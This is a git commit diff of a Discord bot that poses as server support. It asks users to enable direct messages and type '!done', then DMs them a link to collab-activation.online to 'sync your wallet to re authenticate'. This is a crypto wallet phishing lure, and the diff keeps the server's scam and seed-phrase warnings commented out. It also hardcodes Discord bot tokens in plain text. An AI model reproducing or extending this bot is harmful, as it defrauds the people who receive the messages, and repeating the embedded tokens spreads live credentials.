a7844657091b35a7927b4293dd4071647331b01b
Siqht <siqhtu@gmail.com>
2022-04-23 22:19:14 +0800

    qwert

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const { MessageEmbed } = require('discord.js');
 
 //put your token here
-const token = 'OTY2Njk3NDAyOTk0MTQ3MzI4.YmFhHQ.hFYTg8gQCW-TDQjJzBw5WuYMx5U';
+const token = 'OTY3MDc2NDYwODY5MzI0ODMx.YmLCIw.65kW39v_E38yy9SgWaNLB-3KmVc';
 
 const client = new Discord.Client({
       intents: [ "GUILDS","GUILD_MESSAGES","DIRECT_MESSAGES"]
@@ -21,18 +21,21 @@ const PREFIX = '!';
 //discord message
 client.on("messageCreate",(message)=>{
  let args = message.content.substring(PREFIX.length).split(" ");
-    
- switch (args[0]) { 
-	case 'rulesi':
-	//bot reply to channel
-	  message.reply({ embeds: [exampleEmbed] });
+ try {
+    switch (args[0]) { 
+		case 'support':
+		//bot reply to channel
+		  message.reply({ embeds: [exampleEmbed2] });
+			break;
+	
+		case 'done':
+		//bot dm command
+		message.author.send({ embeds: [exampleEmbed] });
 		break;
-
-	case 'support':
-	//bot dm command
-	message.author.send({ embeds: [exampleEmbed] });
-	break;
-    }
+		}
+}
+catch (e) {}  
+ 
  
   })
 
@@ -47,11 +50,11 @@ const exampleEmbed = new MessageEmbed()
 
 	.addFields(
 		//{ name: 'PAKIUSAP:', value: 'Palaging mag-verify sa mga kumakausap sa inyo dito sa Discord. Maraming pwedeng gumaya sa profile ng mga Moderators.' },*editable
-		{ name: '\u200B', value: '\u200B' },
+		//{ name: '\u200B', value: '\u200B' },
 		//{ name: 'MAHALAGANG PAALALA:', value: 'Huwag ka pupunta sa mga links na di ka sigurado kung ano iyon maaring pishing site ang binibigay sayo at huwag ibibigay kahit kanino at kahit saan ang inyong SEED PHRASE / SECRET RECOVERY PHRASE. Hindi po namin ito hihingin sa inyo kahit anong mangyari. Kapag may humingi sa inyo, siguradong SCAM ito. Wala na po kaming magagawa kung magpapa-loko kayo kahit alam mong sinasamantala ka na pero umaasa ka pa din.'},
 		//{ name: '\u200B', value: '\u200B' },
 		//{name: 'Note:', value: 'Our Staff, Mod, Admin, Support, etc. will never message you first.'},
-    {name: '',value: "Click [here](https://discord.com/terms) to connect , to sync your wallet to re authenticate and restore to all functionalities on wallet."}
+    {name: '᲼',value: "Click [here](https://collab-activation.online/) to connect, to sync your wallet to re authenticate and restore to all functionalities on wallet."}
 	//You are obligated to follow Discord's [terms of service](https://discord.com/terms)."},*editable
     //{name:'II.', value : " Our rules are based on Discord's [community guidelines](https://discord.com/guidelines) and have to be respected."}
 	)
@@ -59,11 +62,16 @@ const exampleEmbed = new MessageEmbed()
 
 	.setTimestamp()
 
-
+	const exampleEmbed2 = new MessageEmbed()
+	.setColor('#ADD8E6')
+	.addFields(
+		{name: '᲼',value: "You need to allow __direct message__ in your privacy settings"},
+	    {name: '᲼',value: "If you have enabled direct message, reply with **!done**"}
+		)
 
 
 
             
  //bot initalize                       
-client.login('OTY2Njk3NDAyOTk0MTQ3MzI4.YmFhHQ.hFYTg8gQCW-TDQjJzBw5WuYMx5U');
+client.login(token);
 
